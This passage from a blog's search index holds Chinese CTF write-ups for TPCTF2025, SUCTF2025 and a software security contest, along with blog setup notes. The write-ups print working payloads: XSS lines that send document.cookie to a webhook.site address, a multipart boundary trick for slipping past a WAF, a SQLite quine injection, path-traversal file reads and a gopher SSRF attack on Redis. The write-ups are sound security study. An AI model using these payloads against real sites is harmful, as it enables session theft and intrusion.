","date":"2025-04-13","objectID":"/posts/28dc684/:7:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"参考\rhttps://www.freebuf.com/articles/web/283795.html https://www.ascotbe.com/2024/12/27/CodeQL/ https://drun1baby.top/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ ","date":"2025-04-13","objectID":"/posts/28dc684/:8:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["CTF"],"content":"前言\r清华北大办的比赛，质量不用质疑，Misc 的话手搓二维码的时候一直对不上，貌似是上下颠倒了，qrzybox原来还能自动补全，算是学到了，Web 的话就复现了下 xss 的，其他题看下 wp 再说吧，题目后打 * 的是复现 ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:1:0","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"Web\r","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:0","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"baby layout\r思路很清楚，可以写 content 和 layout ，然后bot访问指定 url 时会将 flag 注入到访问的的那个网页的 cookie 中，打 xss 带 cookie。可以看到代码中对 content 和 layout 的内容都是用 DOMPurify.sanitize() 来进行了个过滤，而且可以在配置文件中看到 dompurify 版本为 3.2.4，应该不是打 0day 我们这里重点看下 content 和 layout 的实现 app.post('/api/post', (req, res) =\u003e { const { content, layoutId } = req.body; if (typeof content !== 'string' || typeof layoutId !== 'number') { return res.status(400).send('Invalid params'); } if (content.length \u003e LENGTH_LIMIT) return res.status(400).send('Content too long'); const layout = req.session.layouts[layoutId]; if (layout === undefined) return res.status(400).send('Layout not found'); const sanitizedContent = DOMPurify.sanitize(content); //将 layout 中的 {{content}} 替换为 content 的值 const body = layout.replace(/\\{\\{content\\}\\}/g, () =\u003e sanitizedContent); if (body.length \u003e LENGTH_LIMIT) return res.status(400).send('Post too long'); const id = randomBytes(16).toString('hex'); posts.set(id, body); req.session.posts.push(id); console.log(`Post ${id} ${Buffer.from(layout).toString('base64')} ${Buffer.from(sanitizedContent).toString('base64')}`); return res.json({ id }); }); app.post('/api/layout', (req, res) =\u003e { const { layout } = req.body; if (typeof layout !== 'string') return res.status(400).send('Invalid param'); if (layout.length \u003e LENGTH_LIMIT) return res.status(400).send('Layout too large'); const sanitizedLayout = DOMPurify.sanitize(layout); const id = req.session.layouts.length; req.session.layouts.push(sanitizedLayout); return res.json({ id }); }); 可以看到在 content 的实现中是先检测再替换，也就是说我们可以将 payload 分为两段，一段写入 layout ，并将会被过滤的部分替换为 {{content}}，第二段写入 content，值就为会被过滤的部分，这样的话 content 和 layout 都可以绕过 DOMPurify.sanitize() 的检测，而且也会将 content 的值拼入 layout 中，形成最后的恶意 payload。而之所以 content 的值不会被过滤，应该是没有形成一个完整的 html ，没被检测到，可以在官方的github 上找到个 demo 来测试一下：DOMPurify 3.2.4 “Shipwreck” 可以看到第二次就被过滤了而第一次却没有被过滤，弹个窗先 layout 为 \u003caudio src={{content}}\u003e content 为 \"a\" onloadstart=\"alert(1)\" create post 就弹窗了 源码也可以看到是成功插入了的 带下 cookie \"a\" onloadstart=\"fetch('https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=' + document.cookie)\" 后面两道加强题都可以参考：https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:1","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout*\r加强了过滤 将 ALLOWED_ATTR 置为空，也就是不能引用属性，但跟进后会发现还可以用 ALLOW_DATA_ATTR 和 ALLOW_ARIA_ATTR 也就是说我们依然可以用自定义的 data，后接恶意代码即可 layout \u003caudio data-a={{content}}\u003e content a\" src=\"a\" onloadstart=\"fetch('https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=' + document.cookie)\" 必须有 src 属性，不然会报错 ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:2","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout revenge*\r这道就修复了上面的非预期，把 ALLOW_ARIA_ATTR 和 ALLOW_DATA_ATTR 都设为了 false 从 出题人的wp 中看到dompurify非常严格，\u003cstyle\u003e中的任何HTML标签都将被过滤。但是，正则表达式仅检查 /\u003c[/\\ w]/ ，因此不会过滤 \u003c{{content}} ，可以用其来绕过恶意的标签 但不能直接写在 style 标签里，因为 style 标签中的会被当作 css 解析，所以把 {{content}} 包裹在 style 便签里即可，第一个 {{content}} 是用来闭合第一个 style 标签的，而前面的 a 的话是开一个新的节点，干扰html解析规则啥的，没太懂，但是不加就会解析失败 layout a\u003cstyle\u003e{{content}}\u003c{{content}}\u003c/style\u003e content img src=\"a\" onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`+document.cookie) \u003cstyle\u003e\u003c/style\u003e ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:3","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"supersqli\rmanage.py 加个参数启动服务器，方便调试 if len(sys.argv) == 1: sys.argv.append(\"runserver\") 在 supersqli\\web_deploy\\src\\blog\\views.py 文件中的 flag 函数中我们可以发现存在 sql 注入 但是 supersqli\\web_deploy\\simplewaf\\main.go 中的 waf 限制的很死 var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 注意到在 go 中加了个判断，判断 mediaType 是否为 multipart/form-data 找到一篇有关利用 multipart/form-data 解析差异实现绕过的文章：https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/ 但文章中用的是 flask 框架，貌似在这里的 Django 中行不通，看下 Django 框架中对 multipart/form-data 处理，跟进到 multipartparser.py 中可以发现 Django 是通过请求头中的 Content-Disposition 字段来区分每个字段 而在 go 中的 request.go 的 multipartReader 函数中 func (r *Request) multipartReader(allowMixed bool) (*multipart.Reader, error) { v := r.Header.Get(\"Content-Type\") if v == \"\" { return nil, ErrNotMultipart } if r.Body == nil { return nil, errors.New(\"missing form body\") } d, params, err := mime.ParseMediaType(v) if err != nil || !(d == \"multipart/form-data\" || allowMixed \u0026\u0026 d == \"multipart/mixed\") { return nil, ErrNotMultipart } boundary, ok := params[\"boundary\"] if !ok { return nil, ErrMissingBoundary } return multipart.NewReader(r.Body, boundary), nil } 可以看到这里是用 boundary 的值来分隔 multipart 请求中的各个部分，截止符的话当然就是 boundary 的值加上 -- 了 经过上面的分析我们发现 go 和 Django 中用来区分不同字段的方法是不一样的，可以利用这个解析差异来绕过 waf ，请求是先经过 go 处理再经过 Django 的，我们可以先用 --boundary-- 来截止，然后再传 password 的值。当请求体为 Content-Type: multipart/form-data; boundary=----xxx Content-Length: 137 ------xxx Content-Disposition: form-data; name=\"username\" admin ------xxx-- Content-Disposition: form-data; name=\"password\"; 111 go 只会解析 ------xxx-- 前的值，也就是返回 请求的 POST 参数: username = admin 而 Django 则会返回两个参数的值 请求的 POST 参数: username = admin password = 111 后面 sql 注入的话是打 sqlite，盲注不知道为啥打不了，然后发现能打 quine 注入，这里只判断了传入的 password 是否相同，确实也比较符合其利用场景，用文章中的脚本构造下 payload：https://blog.csdn.net/qq_35782055/article/details/130348274，稍微改下，没过滤空格，不用 repalce 为 /**/ sql = input (\"输入你的sql语句,不用写关键查询的信息 形如 1'union select #\\n\") sql2 = sql.replace(\"'\",'\"') base = \"replace(replace('.',char(34),char(39)),char(46),'.')\" final = \"\" def add(string): if (\"--+\" in string): tem = string.split(\"--+\")[0] + base + \"--+\" if (\"#\" in string): tem = string.split(\"#\")[0] + base + \"#\" return tem def patch(string,sql): if (\"--+\" in string): return sql.split(\"--+\")[0] + string + \"--+\" if (\"#\" in string): return sql.split(\"#\")[0] + string + \"#\" res = patch(base.replace(\".\",add(sql2)),sql).replace(\"'.'\",'\".\"') print(res) 最后经尝试发现是两列，因此传入 1' union select 1,2,--+ ，得到 payload 1' union select 1,2,replace(replace('1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+',char(34),char(39)),char(46),'1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+')--+ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:4","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"前言\r好多题，质量很高，misc没怎么看，全在看web，Java还是打不动😿，还有一些关于云的，也不会，先贴一下写了的wp，pop当时没做，其他题之后有空复现一下 ","date":"2025-01-14","objectID":"/posts/48766ef/:1:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Misc\r","date":"2025-01-14","objectID":"/posts/48766ef/:2:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_checkin\r找到个password：SePassWordLen23SUCT 加密方式：PBEWithMD5AndDES 感觉hacker这个用户里的密码就是盐，但是爆破出来是 hacker（怎么不是8位） 迭代次数应该是默认的1000，不行的话爆破也行，OUTPUT应该就是密文：ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg= 后来发现不用盐也可以解密，密码SePassWordLen23SUCT其实是暗示密码length为23，其实应该是SUCTF，照着加密脚本：https://blog.csdn.net/iin729/article/details/128432332，叫ai写了个python解密脚本 import base64 import hashlib import re import itertools import string from Crypto.Cipher import DES def get_derived_key(password, salt, count): key = password + salt for i in range(count): m = hashlib.md5(key) key = m.digest() return (key[:8], key[8:]) def decrypt(msg, password): msg_bytes = base64.b64decode(msg) salt = msg_bytes[:8] enc_text = msg_bytes[8:] (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) text = crypter.decrypt(enc_text) # Remove padding at the end, if any return re.sub(r'[\\x01-\\x08]', '', text.decode(\"utf-8\", errors=\"ignore\")) def brute_force_decrypt(ciphertext, prefix, length, charset): # Calculate the number of missing characters missing_length = length - len(prefix) # Generate all possible combinations of the missing characters for combination in itertools.product(charset, repeat=missing_length): # Construct the full password password = prefix + ''.join(combination) try: # Attempt to decrypt the ciphertext decrypted_text = decrypt(ciphertext, password.encode(\"utf-8\")) # Check if the decrypted text contains \"SUCTF\" if \"SUCTF\" in decrypted_text: print(f\"Found valid password: {password}\") print(f\"Decrypted text: {decrypted_text}\") return password, decrypted_text except Exception as e: # If decryption fails, just continue to the next combination continue print(\"No valid password found.\") return None, None def main(): # Known prefix of the password prefix = \"SePassWordLen23SUCTF\" # Total length of the password length = 23 # Character set to use for the missing characters (alphanumeric) charset = string.ascii_letters + string.digits # Ciphertext to decrypt ciphertext = \"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=\" # Start brute-forcing password, decrypted_text = brute_force_decrypt(ciphertext, prefix, length, charset) if password: print(f\"Success! Password: {password}\") print(f\"Decrypted text: {decrypted_text}\") if __name__ == \"__main__\": main() ","date":"2025-01-14","objectID":"/posts/48766ef/:2:1","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_RealCheckin\rhello ctf -\u003e 🏠🦅🍋🍋🍊 🐈🌮🍟 $flag -\u003e 🐍☂️🐈🌮🍟{🐋🦅🍋🐈🍊🏔️🦅_🌮🍊_🐍☂️🐈🌮🍟_🧶🍊☂️_🐈🍎🌃_🌈🦅🍎🍋🍋🧶_🐬🍎🌃🐈🦅} $flag 前五个为suctf，根据映射关系最后大括号里面的推断出来是 ? e l c o ? e _ t o _ s u c t f _ ? o u _ c ? ? _ r e ? l l ? _ d ? ? c e 其实第一段很明显是welcome，可以发现该emoji代表的东西的英文首字母就是该emoji代表的字符，故最后flag为 suctf{welcome_to_suctf_you_can_really_dance} ","date":"2025-01-14","objectID":"/posts/48766ef/:2:2","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Web\r","date":"2025-01-14","objectID":"/posts/48766ef/:3:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_blog\rarticles 目录有目录穿越，读启动命令，双写绕过一下 article?file=articles/....//....//....//....//....//....//proc/self/cmdline 拿到pythonapp/app.py，拿源码 article?file=articles/....//....//app/app.py 源码 from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": \"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_friendlink(index): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) if 0 \u003c= index \u003c len(friend_links): del friend_links[index] return redirect(url_for('friendlinks')) @app.route('/article') def article(): if 'username' not in session: return redirect(url_for('login')) file_name = request.args.get('file', '') if not file_name: return render_template('article.html', file_name='', content=\"未提供文件名。\") blacklist = [\"waf.py\"] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template('article.html', file_name=file_name, content=\"大黑阔不许看\") if not file_name.startswith('articles/'): return render_template('article.html', file_name=file_name, content=\"无效的文件路径。\") if file_name not in articles.values(): if session.get('username') != 'admin': return render_template('article.html', file_name=file_name, content=\"无权访问该文件。\") file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace('../', '') try: with open(file_path, 'r', encoding='ut","date":"2025-01-14","objectID":"/posts/48766ef/:3:1","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_photogallery\r404页面 参考 [FSCTF 2023]签到plus 尝试打下 php＜= 7 . 4 . 21 development server源码泄露，其实随便访问一下就出源码了 unzip.php \u003c?php error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_FILES['file']) \u0026\u0026 $_FILES['file']['error'] === UPLOAD_ERR_OK) { $uploadedFile = $_FILES['file']; $zipname = $uploadedFile['tmp_name']; $path = $uploadDir; $result = unzip($zipname, $path); if ($result === true) { header(\"Location: index.html?status=success\"); exit(); } else { header(\"Loca","date":"2025-01-14","objectID":"/posts/48766ef/:3:2","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"前言\r比赛时间有点阴间，题目的话全是二进制，能看的题就只有三道，Java听说是个1day，摆了 ","date":"2025-01-07","objectID":"/posts/6c39531/:1:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"钓鱼邮件\r记事本打开是一大串base64编码，解码后是个zip，下载下来爆破密码，最后密码为 20001111，得到个exe，拿到奇安信在线沙箱出 尝试后发现是222.218.218.218那个，md5一下就行 ","date":"2025-01-07","objectID":"/posts/6c39531/:2:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"CachedVisitor\rmain.lua local function read_file(filename) local file = io.open(filename, \"r\") if not file then print(\"Error: Could not open file \" .. filename) return nil end local content = file:read(\"*a\") file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\"##LUA_START##(.-)##LUA_END##\") if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\"Error executing Lua code: \", result) end else print(\"Error loading Lua code: \", err) end else print(\"Error: No valid Lua code block found.\") end end local function main() local filename = \"/scripts/visit.script\" local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() 最后是执行了一个文件，而/scripts/visit.script的作用是从外部 URL 获取数据并将其缓存到 Redis 中，一个很明显的ssrf打redis，刚开始走偏了，以为是打个cve 可以直接把/scripts/visit.script覆盖成执行/readflag并获取回显，用dict协议老是会报引号有问题，用gopher协议打 这里选择的是phpshell，默认生成的是shell.php，解码改一下文件名和长度 最后编码的话还是建议用bp直接编码，其他的总会出点问题 接下来是二进制爷的wp ","date":"2025-01-07","objectID":"/posts/6c39531/:3:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"donntyousee\r打开文件逐步调试 这里面是call-ret型花指令，所以把相关内容nop掉，大致格式是： push rax; call loop; loop: xxxxx; ret; pop rax; 每个相关的函数都有这个，可以全部nop掉 调用了这两个函数，分别都是call r8，只有动态调试 第一个是执行Sbox的初始化，用的数据是byte_5C5110，这个是key 第二个函数是执行加密，很明显是一个魔改RC4，可以直接逆向。 继续往后调试 这里进行了比较，sub_4E4060是输出正确与否，所以看v7的终值，直接解密即可 key:921C2B1FBAFBA2FF07697D77188C data:25 cd 54 af 51 1c 58 d3 a8 4b 4f 56 ec 83 5d d4 f6 47 4a 6f e0 73 b0 a5 a8 c3 17 81 5e 2b f4 f6 71 ea 2f ff a8 63 99 57 flag:dart{y0UD0ntL4cKg0oD3y34T0F1nDTh3B4aUtY} ","date":"2025-01-07","objectID":"/posts/6c39531/:4:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["杂记"],"content":"前置\r下载好Git、Go 和 Dart Sass、hugo Dart Sass我这用的npm下的 npm install -g sass sass --version //验证安装 hugo下载：https://github.com/gohugoio/hugo/releases（下载extend拓展版的，方便自定义加东西，记得加环境变量） 其他我都配好了，不多说 ","date":"2025-01-06","objectID":"/posts/5c6225e/:1:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"博客配置\r然后按照这个来吧： https://fixit.lruihao.cn/zh-cn/documentation/getting-started/quick-start/ 这里echo时要去掉双引号，其他的不多说 ","date":"2025-01-06","objectID":"/posts/5c6225e/:2:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"美化记录（持续更新ing）\r","date":"2025-01-06","objectID":"/posts/5c6225e/:3:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"2025.2.28\r有人催我加友链，于是弄下友链，感觉 loveit 主题和 fixit 主题差不多，按照文章：https://blog.233so.com/2020/04/friend-link-shortcodes-for-hugo-loveit/ 来就好，只需要注意下在修改FixIt/assets/css/_page/的_single.scss时引入的行应该为 @import \"../_partials/_single/friend\"; fixit 的目录比 loveit 的目录少了个 s ，其他的话叫 ai 改了个颜色，把旋转去掉了，再加了个微微放大的动画，我的 friend.scss // ===== 变量定义 ===== $shadow-green: rgba(50, 205, 50, 0.3); // 绿色阴影 $hover-green: rgba(144, 238, 144, 0.3); // 悬停背景色 $hover-scale: 1.02; // 悬停放大比例 $transition-time: 0.3s; // 过渡动画时间 // ===== 基础样式 ===== .friendurl { text-decoration: none !important; color: black; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%; border: 1px solid #ddd; padding: 2px; box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.15); margin: 14px 0 0 14px !important; background-color: #fff; } .frienddiv { // ===== 布局属性 ===== height: 92px; margin-top: 10px; width: 48%; display: inline-block !important; border-radius: 5px; // ===== 视觉效果 ===== background: rgba(255, 255, 255, 0.2); box-shadow: 4px 4px 2px 1px $shadow-green; // ===== 过渡动画 ===== transition: all $transition-time ease-in-out; // ===== 悬停状态 ===== \u0026:hover { background: $hover-green; transform: scale($hover-scale); box-shadow: 4px 4px 6px 2px rgba(50, 205, 50, 0.25); // 加强阴影 } // ===== 左侧头像区域 ===== .frienddivleft { width: 92px; float: left; margin-right: 2px; } // ===== 右侧文字区域 ===== .frienddivright { margin-top: 18px; margin-right: 18px; } // ===== 文字控制 ===== .friendname, .friendinfo { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; } } // ===== 手机端适配 ===== @media screen and (max-width: 600px) { .frienddiv { width: 100% !important; // 单列显示 \u0026:hover { transform: scale(1.01); // 缩小放大比例 } .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 14px; } } } ","date":"2025-01-06","objectID":"/posts/5c6225e/:3:1","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":null,"content":"Introduction👨‍💻\rWeb/Misc@D0g3 想学渗透，想学Java ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"Contact me☎️\rQQ：Mjg2OTg3Mzk1OQ== Github：https://github.com/6s6-630 ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"About","uri":"/about/"},{"categories":null,"content":"D0g3\rgaorenyusi\rWeb\rYuy0ung\rWeb\u0026Misc\rfupanc\rWeb\rVVkladg0\rWeb\rtammy66\rWeb\rLitsasuk\rWeb\rpRism\rRe\r","date":"0001-01-01","objectID":"/links/:0:1","tags":null,"title":"Links","uri":"/links/"},{"categories":null,"content":"Friends\rLamentXU\r全栈天才少年，含金量不多说\r","date":"0001-01-01","objectID":"/links/:0:2","tags":null,"title":"Links","uri":"/links/"}]